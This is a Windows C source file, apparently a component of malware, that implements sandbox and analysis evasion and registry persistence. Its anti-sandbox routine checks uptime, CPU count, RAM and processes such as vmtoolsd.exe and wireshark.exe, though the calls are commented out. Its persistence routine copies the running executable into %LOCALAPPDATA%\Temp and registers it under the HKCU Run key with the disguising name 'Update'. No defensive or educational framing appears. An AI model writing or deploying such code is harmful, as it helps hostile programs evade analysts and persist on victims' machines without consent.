#ifdef _WIN32

#include "Evasion.h"

#include <stdio.h>
#include <string.h>

#include <tlhelp32.h>
#include <winreg.h>

static BOOL hasEnoughUptime(void) {
    ULONGLONG up = GetTickCount64();
    return up > (ULONGLONG)(2 * 60 * 1000);
}

static BOOL hasEnoughResources(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return FALSE;
    }

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) {
        return TRUE;
    }

    if (ms.ullTotalPhys < (ULONGLONG)(2ULL * 1024 * 1024 * 1024)) {
        return FALSE;
    }

    return TRUE;
}

static BOOL isSandboxProcessPresent(void) {
    const char* suspects[] = {
        "vboxservice.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "procmon.exe",
        "wireshark.exe",
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        return FALSE;
    }

    do {
        for (int i = 0; i < (int)(sizeof(suspects) / sizeof(suspects[0])); i++) {
            if (_stricmp(pe.szExeFile, suspects[i]) == 0) {
                CloseHandle(snap);
                return TRUE;
            }
        }
    } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return FALSE;
}

BOOL Evasion_RunAntiSandboxChecks(void) {
    // if (IsDebuggerPresent()) {
    //     return FALSE;
    // }

    // if (!hasEnoughUptime()) {
    //     return FALSE;
    // }

    // if (!hasEnoughResources()) {
    //     return FALSE;
    // }

    // if (isSandboxProcessPresent()) {
    //     return FALSE;
    // }

    return TRUE;
}

static BOOL buildDestPath(char* outPath, DWORD outLen) {
    char selfPath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) {
        return FALSE;
    }

    const char* base = strrchr(selfPath, '\\');
    base = base ? (base + 1) : selfPath;

    char localAppData[MAX_PATH] = {0};
    DWORD n = GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) {
        DWORD t = GetTempPathA(MAX_PATH, localAppData);
        if (t == 0 || t >= MAX_PATH) {
            return FALSE;
        }

        // 如果 GetTempPath 返回的路径不是 LocalAppData\Temp，也尽量遵循需求：LocalAppData\Temp
        // 这里直接使用系统 temp 目录。
        snprintf(outPath, outLen, "%s%s", localAppData, base);
        return TRUE;
    }

    snprintf(outPath, outLen, "%s\\Temp\\%s", localAppData, base);
    return TRUE;
}

BOOL Persistence_EnableRunKey() {

    char selfPath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) {
        return FALSE;
    }

    char destPath[MAX_PATH] = {0};
    if (!buildDestPath(destPath, MAX_PATH)) {
        return FALSE;
    }

    // 拷贝自身到 %LOCALAPPDATA%\Temp
    CopyFileA(selfPath, destPath, FALSE);

    HKEY hKey = NULL;
    if (RegCreateKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            NULL,
            0,
            KEY_SET_VALUE,
            NULL,
            &hKey,
            NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    LONG res = RegSetValueExA(hKey, "Update", 0, REG_SZ, (const BYTE*)destPath, (DWORD)strlen(destPath) + 1);
    RegCloseKey(hKey);

    return res == ERROR_SUCCESS;
}

#endif
